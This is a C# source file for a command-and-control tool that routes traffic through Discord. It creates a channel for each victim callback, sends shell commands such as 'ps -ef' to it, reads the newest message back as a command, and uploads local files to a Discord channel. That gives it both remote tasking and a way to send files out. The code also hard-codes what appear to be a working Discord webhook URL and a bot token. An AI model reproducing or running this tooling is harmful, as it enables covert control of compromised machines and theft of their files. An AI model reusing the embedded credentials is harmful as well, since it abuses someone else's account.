using System.Net;
using System.Text;
using System.Collections.Generic;
using Newtonsoft.Json;
using C2Send.Models;
using System.Net.Http.Headers;


//Use username for callback ID and then put payload to execute in CmdPayload
//each call back should make a new channel based off UUID


static void Send(String UUID, String Cmd)
{
    var Client = new HttpClient();
    var UUIDOfCallback = UUID;
    var CmdPayload = Cmd;
    //Probs should B64 for Sec or something like ROT13
    var Payload = new Dictionary<string, string>()
    {
        { "username", UUIDOfCallback },
        { "content", CmdPayload }
    };
    var URL = "https://discord.com/api/webhooks/971737781384675328/RaeEc8xfR_YwR4za7e26tJPr8pNeUbFbA7RFJs0Mx5QI2P0B5UzvBjXhU7z04sYzYR0-";
    var content = new StringContent(JsonConvert.SerializeObject(Payload), Encoding.UTF8, "application/json");
    Client.PostAsync(URL, content).Wait();

}

static async Task<List<DiscordMessage>> ReadMessagesAsync()
{
    var Token = "Bot OTcyMTIxMjk0NjEzMTUxNzU0.Gh_Tiz.qlke5Teqoi7yhrx3v2DVHSUlDoARMOLJ3Yy6VM";
    var ChannelID = "971737749184978997";
    var Client = new HttpClient();
    Client.DefaultRequestHeaders.Add("Authorization", Token);
    //Probs should B64 for Sec or something like ROT13
    var URL = "https://discordapp.com/api/channels/" + ChannelID + "/" + "messages?limit=1"; //Adding limit means only get newest 
    var res = await Client.GetAsync(URL);
    await res.Content.ReadAsStringAsync();
    string responseMessages = await res.Content.ReadAsStringAsync();
    return JsonConvert.DeserializeObject<List<DiscordMessage>>(responseMessages) ?? new List<DiscordMessage>(); // eithe return the responses Or if it fails get a derisalised response  AKA with d ata or no data
}

static async Task<ChannelResponse> CreateChannelAsync(string UUIDOfCallback) //server and guild are the same lol
{
    var Token = "Bot OTcyMTIxMjk0NjEzMTUxNzU0.Gh_Tiz.qlke5Teqoi7yhrx3v2DVHSUlDoARMOLJ3Yy6VM";
    var GuildID = "971737749184978994";
    var Client = new HttpClient();
    Client.DefaultRequestHeaders.Add("Authorization", Token);
    var json = UUIDOfCallback + 0;

    var Payload = new ChannelCreateSend
    {
             name = UUIDOfCallback,
             type = 0
    };

    Console.WriteLine(Payload);
    var URL = "https://discordapp.com/api/guilds/" + GuildID + "/channels"; //Adding limit means only get newest 
    var content = new StringContent(JsonConvert.SerializeObject(Payload), Encoding.UTF8, "application/json");
    var res = await Client.PostAsync(URL, content);
    string responseMessages = await res.Content.ReadAsStringAsync();
    Console.WriteLine(JsonConvert.DeserializeObject(responseMessages));
    return JsonConvert.DeserializeObject<ChannelResponse>(responseMessages) ?? new ChannelResponse(); // eithe return the responses Or if it fails get a derisalised response  AKA with d ata or no data
}

static async Task FileUploadAsync(string Filepath,string FileOut) //8mb by default, A file upload size limit applies to all files in a request 
{
try
    {
        using (var Client = new HttpClient())
        {
            using (var Stream = File.OpenRead(Filepath)) //8mb max filesize
            {
                var ChannelID = "971737749184978997";
                var URL = "https://discord.com/api/channels/" + ChannelID + "/messages";
                var Token = "Bot OTcyMTIxMjk0NjEzMTUxNzU0.Gh_Tiz.qlke5Teqoi7yhrx3v2DVHSUlDoARMOLJ3Yy6VM";
                Client.DefaultRequestHeaders.Add("Authorization", Token);
                var Content = new MultipartFormDataContent();
                var File_Content = new ByteArrayContent(new StreamContent(Stream).ReadAsByteArrayAsync().Result);
                File_Content.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                File_Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
                {
                    FileName = Filepath,
                    Name = FileOut,
                };
                Content.Add(File_Content);
                Console.WriteLine("Uploading.. this may take some time for larger files MAx size 8mb on non Nitro (100mb)");
                var res = await Client.PostAsync(URL, Content);
                string responseMessages = await res.Content.ReadAsStringAsync();
                Console.WriteLine(JsonConvert.DeserializeObject(responseMessages));
            }
        }
        } catch (Exception)
    {
        Console.WriteLine("Upload Failed");
    }

}                                                                                                    //Fix re



static async Task SendMessageAsync(String Cmd)
{
    var Client = new HttpClient();
    var CmdPayload = Cmd;
    var ChannelID = "971737749184978997";
    var Token = "Bot OTcyMTIxMjk0NjEzMTUxNzU0.Gh_Tiz.qlke5Teqoi7yhrx3v2DVHSUlDoARMOLJ3Yy6VM";
    var URL = "https://discord.com/api/channels/" + ChannelID + "/messages";
    Client.DefaultRequestHeaders.Add("Authorization", Token);
    var Payload = new Dictionary<string, string>()
    {
        { "content" , Cmd }
    };
    Console.WriteLine(Payload);
    var content = new StringContent(JsonConvert.SerializeObject(Payload), Encoding.UTF8, "application/json");
    var res = await Client.PostAsync(URL, content);
    string responseMessages = await res.Content.ReadAsStringAsync();
    Console.WriteLine(JsonConvert.DeserializeObject(responseMessages));

}    //await FileUploadAsync(@"C:\Users\Dev\Downloads\OpenTextSOCKSClient14_x64.exe", "myupload.txt"); //filename

await SendMessageAsync("ps -ef");


//
//Main Loop
var messages = await ReadMessagesAsync();
    foreach (var message in messages)
    {

        Console.WriteLine(message.content); //content can be anything from GetMessagesResponses ie Channel etc 
    }



//Send("TeaasGoneCold", "ls -lt");
